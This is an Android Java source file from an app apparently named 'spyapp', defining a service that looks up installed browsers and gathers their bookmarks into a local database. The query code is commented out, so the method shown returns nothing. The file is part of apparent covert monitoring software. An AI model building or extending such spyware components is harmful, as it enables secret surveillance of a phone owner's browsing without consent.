package com.app.spyapp.service;

import android.app.IntentService;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Browser;
import android.text.TextUtils;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Utils;
import com.app.spyapp.model.BrowserModel;

import java.util.ArrayList;


public class BookmarkService extends IntentService {

    private ArrayList<BrowserModel> defaultbrowserBokmarklist;
    private ArrayList<BrowserModel> chromeBroswerBookmarkList;
    private SpyApp spyApp;

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     */
    public BookmarkService() {
        super(BookmarkService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Utils.showStatus(this, "BOOKMARK");
        spyApp = (SpyApp) getApplicationContext();
        boolean isChromeInstall = Utils.isPackageInstalled("com.android.chrome", this);
        if (isChromeInstall) {
            chromeBroswerBookmarkList = getBookmark("content://com.android.chrome.browser/bookmarks", Const.TYPE_CHROME);
            if (chromeBroswerBookmarkList != null && chromeBroswerBookmarkList.size() > 0) {
                for (int i = 0; i < chromeBroswerBookmarkList.size(); i++) {
                    spyApp.getDatabaseHelper().insertBookmark(chromeBroswerBookmarkList.get(i));
                }
            }
        }
        boolean isBrowserInstall = Utils.isPackageInstalled("com.android.browser", this);
        if (isBrowserInstall) {
            defaultbrowserBokmarklist = getBookmark("content://browser/bookmarks", Const.TYPE_DEFAULT);
            if (defaultbrowserBokmarklist != null && defaultbrowserBokmarklist.size() > 0) {
                for (int i = 0; i < defaultbrowserBokmarklist.size(); i++) {
                    spyApp.getDatabaseHelper().insertBookmark(defaultbrowserBokmarklist.get(i));
                }
            }
        }


    }


    private ArrayList<BrowserModel> getBookmark(String uri, String type) {

//        ArrayList<BrowserModel> broswerList = new ArrayList<>();
//        String selection = Browser.BookmarkColumns.BOOKMARK + " = 1";
//        StringBuffer sb = new StringBuffer();
//        String[] proj = new String[]{Browser.BookmarkColumns._ID, Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.DATE};
//        Uri uriCustom = Uri.parse(uri);
////        Uri uriCustom = Uri.parse("content://org.mozilla.firefox.db.browser/bookmarks");
//        Cursor cursor = getContentResolver().query(uriCustom, proj, selection, null, Browser.BookmarkColumns.DATE + " DESC");
//        cursor.moveToFirst();
//
//        if (cursor.moveToFirst() && cursor.getCount() > 0) {
//            boolean cont = true;
//            sb.append("Browse Details :");
//            while (cursor.isAfterLast() == false && cont) {
//                String date = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.DATE));
//                String callDayTime = "";
//                if (!TextUtils.isEmpty(date)) {
//                    callDayTime = Utils.convertMilisToDate(Long.parseLong(date));
//                }
//                String id = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns._ID));
//                String title = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.TITLE));
//                String url = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.URL));
//                // Do something with title and url
//                BrowserModel browserModel = new BrowserModel();
//                browserModel.setBookmarkid(id);
//                browserModel.setTitle(title);
//                browserModel.setUrl(url);
//                browserModel.setType(type);
//                browserModel.setDatetime(callDayTime);
//                broswerList.add(browserModel);
//                sb.append("\nTitle:--- " + title + " \nURL:--- " + url + " \nDate:--- " + callDayTime);
//                sb.append("\n----------------------------------");
//                cursor.moveToNext();
//            }
//            return broswerList;
//        }
        return null;
    }


}
